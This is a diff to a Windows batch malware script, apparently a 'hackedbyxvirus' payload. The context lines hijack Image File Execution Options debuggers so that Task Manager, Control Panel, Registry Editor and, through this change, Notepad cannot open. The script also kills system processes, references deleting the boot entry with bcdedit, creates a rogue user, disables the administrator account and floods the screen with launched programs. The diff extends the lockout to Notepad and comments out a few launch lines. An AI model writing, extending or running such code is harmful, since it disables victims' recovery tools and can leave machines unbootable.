@@ -134,6 +134,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Task Manager && pause && exit" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Control Panel && pause && exit" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Registry Editor && pause && exit" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Notepad && pause && exit" /f
 taskkill /f /im SearchUI.exe
 taskkill /f /im taskmgr.exe
 taskkill /f /im powershell.exe
@@ -176,6 +177,7 @@ bcdedit /delete {current} /f
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Task Manager && pause && exit" /f
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Control Panel && pause && exit" /f
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Registry Editor && pause && exit" /f
+    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Notepad && pause && exit" /f
     net user hackedbyxvirus%random% /add /random /passwordchg:yes
     net user administrator /active:no
     color a
@@ -187,17 +189,17 @@ bcdedit /delete {current} /f
     start curl ascii.live/rick>nul
     start curl ascii.live/dvd>nul
     start curl parrot.live>nul
-    start regedit>nul
+ :: start regedit>nul
     start winver>nul
     start mspaint>nul
     start taskmgr>nul
     start wscript>nul
     start cleanmgr>nul
     start certmgr>nul
-    start notepad>nul
+::  start notepad>nul
     start cmd>nul
     start iexplore>nul
-    start control>nul
+::  start control>nul
     start calc>nul
     start wordpad>nul
     start hh>nul
